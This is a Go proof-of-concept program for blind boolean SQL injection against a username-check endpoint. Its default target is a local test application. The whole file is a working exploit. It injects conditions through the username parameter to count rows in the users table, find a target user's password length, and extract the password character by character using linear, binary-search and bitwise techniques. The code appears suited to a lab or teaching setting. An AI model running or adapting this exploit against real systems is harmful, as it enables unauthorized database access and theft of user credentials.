package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"time"
)

// jsonResponse mirrors the JSON envelope returned by /check-username.
type jsonResponse struct {
	Message string `json:"message"`
}

var (
	host     string
	target   string
	reqCount int
)

// oracle injects a boolean condition into the vulnerable /check-username
// endpoint and returns true when the condition evaluates to TRUE in MySQL.
//
// Injection template:
//
//	{target}' AND {condition}); -- -
//
// The server-side query is:
//
//	SELECT EXISTS(SELECT 1 FROM users WHERE username='{input}');
//
// After injection it becomes:
//
//	SELECT EXISTS(SELECT 1 FROM users WHERE username='{target}' AND {condition}); -- -');
//
// TRUE  → username row found → response: "usuario indisponivel"
// FALSE → no row matches    → response: "usuario disponivel"
func oracle(condition string) bool {
	reqCount++

	// Build the raw payload and URL-encode it so special characters
	// (single quotes, spaces, parentheses) survive the GET request.
	raw := fmt.Sprintf("%s' AND %s); -- -", target, condition)
	encoded := url.QueryEscape(raw)
	endpoint := fmt.Sprintf("%s/check-username?username=%s", host, encoded)

	resp, err := http.Get(endpoint) //nolint:gosec // intentionally unsanitised for the PoC
	if err != nil {
		log.Fatalf("[!] HTTP request failed: %v", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("[!] Failed to read response body: %v", err)
	}

	var jr jsonResponse
	if err := json.Unmarshal(body, &jr); err != nil {
		log.Fatalf("[!] JSON parse error: %v (body: %s)", err, body)
	}

	// "usuario indisponivel" means EXISTS() returned 1 → condition is TRUE.
	return jr.Message == "usuario indisponivel"
}

// getRowCount counts rows in the users table by incrementing a counter n
// while COUNT(*) > n evaluates to true, then returning n.
func getRowCount() int {
	count := 0
	for oracle(fmt.Sprintf("(SELECT COUNT(*) FROM users) > %d", count)) {
		count++
	}
	return count
}

// dumpLength discovers the exact byte-length of the target user's password
// by iterating LENGTH(password) = n until a match is found.
func dumpLength() int {
	const maxLen = 256 // safety cap to prevent infinite loops
	for length := 0; length <= maxLen; length++ {
		if oracle(fmt.Sprintf("LENGTH(password)=%d", length)) {
			return length
		}
	}
	log.Fatalf("[!] Password length exceeds safety cap of %d", maxLen)
	return -1
}

// dumpPasswordLinear extracts the password one character at a time by
// iterating over every printable ASCII value (32–126) and testing
// ASCII(SUBSTRING(password, i, 1)) = c until a match is found.
//
// Complexity: O(length × 95) requests — worst case 95 per character.
func dumpPasswordLinear(length int) {
	reqCount = 0
	start := time.Now()

	fmt.Print("[*] Password (linear) = ")
	for i := 1; i <= length; i++ {
		// Probe each printable ASCII code until the oracle confirms a match.
		for c := 32; c <= 126; c++ {
			if oracle(fmt.Sprintf("ASCII(SUBSTRING(password,%d,1))=%d", i, c)) {
				fmt.Printf("%c", c)
				break
			}
		}
	}
	fmt.Println()
	fmt.Printf("[*] Requests: %d | Time: %.2fs\n", reqCount, time.Since(start).Seconds())
}

// dumpPasswordBisection extracts the password using binary search over the
// ASCII value space [32, 126], halving the search range on every oracle call.
//
// Complexity: O(length × log₂(95)) ≈ 7 requests per character.
func dumpPasswordBisection(length int) {
	reqCount = 0
	start := time.Now()

	fmt.Print("[*] Password (bisection) = ")
	for i := 1; i <= length; i++ {
		low, high := 32, 126
		for low <= high {
			mid := (low + high) / 2
			// Ask: is the i-th character's ASCII value ≤ mid?
			// TRUE  → actual value is in [low, mid]   → shrink upper bound.
			// FALSE → actual value is in [mid+1, high] → shrink lower bound.
			if oracle(fmt.Sprintf("ASCII(SUBSTRING(password,%d,1)) <= %d", i, mid)) {
				high = mid - 1
			} else {
				low = mid + 1
			}
		}
		// After convergence, low holds the exact ASCII value.
		fmt.Printf("%c", low)
	}
	fmt.Println()
	fmt.Printf("[*] Requests: %d | Time: %.2fs\n", reqCount, time.Since(start).Seconds())
}

// dumpPasswordBitwise extracts the password by probing each of the 7
// significant bits of the ASCII value independently using bitwise AND.
//
// For bit k: ASCII(SUBSTRING(password, i, 1)) & 2^k > 0 → bit k is set.
//
// Complexity: exactly 7 requests per character — constant regardless of value.
func dumpPasswordBitwise(length int) {
	reqCount = 0
	start := time.Now()

	fmt.Print("[*] Password (bitwise/SQL-Anding) = ")
	for i := 1; i <= length; i++ {
		c := 0
		// Reconstruct the ASCII value bit by bit, from LSB (bit 0) to bit 6.
		for bit := 0; bit < 7; bit++ {
			if oracle(fmt.Sprintf("ASCII(SUBSTRING(password,%d,1)) & %d > 0", i, 1<<bit)) {
				c |= 1 << bit // set the confirmed bit in the accumulator
			}
		}
		fmt.Printf("%c", c)
	}
	fmt.Println()
	fmt.Printf("[*] Requests: %d | Time: %.2fs\n", reqCount, time.Since(start).Seconds())
}

func main() {
	flag.StringVar(&host, "host", "http://localhost:8081", "Base URL of the target application")
	flag.StringVar(&target, "target", "antonio", "Existing username to attack")
	flag.Parse()

	fmt.Println("[*] Starting Blind SQLi PoC")
	fmt.Printf("[*] Target: %s | Host: %s\n\n", target, host)

	// --- Sanity check -------------------------------------------------------
	// Verify the oracle is functional before running any extraction logic.
	// A broken oracle would produce garbage results silently.
	if !oracle("'1'='1'") {
		fmt.Fprintln(os.Stderr, "[!] Oracle sanity check failed for 1=1 — endpoint unreachable or injection broken.")
		os.Exit(1)
	}
	if oracle("'1'='0'") {
		fmt.Fprintln(os.Stderr, "[!] Oracle sanity check failed for 1=0 — response is always true, injection may be broken.")
		os.Exit(1)
	}
	fmt.Println("[*] Oracle sanity checks passed.\n")

	// --- Step 1: Row count --------------------------------------------------
	// Confirm the table isn't empty and get an idea of the dataset size.
	rowCount := getRowCount()
	fmt.Printf("[*] Table `users` has %d row(s).\n", rowCount)

	// --- Step 2: Password length --------------------------------------------
	// Knowing the exact length lets the extraction loops terminate cleanly.
	length := dumpLength()
	fmt.Printf("[*] Password length = %d\n\n", length)

	// --- Step 3: Password extraction — three techniques --------------------

	fmt.Println("[*] Method 1 — Linear scan (worst-case: 95 req/char):")
	dumpPasswordLinear(length)

	fmt.Println("\n[*] Method 2 — Binary search / bisection (≈7 req/char):")
	dumpPasswordBisection(length)

	fmt.Println("\n[*] Method 3 — Bitwise AND / SQL-Anding (exactly 7 req/char):")
	dumpPasswordBitwise(length)
}
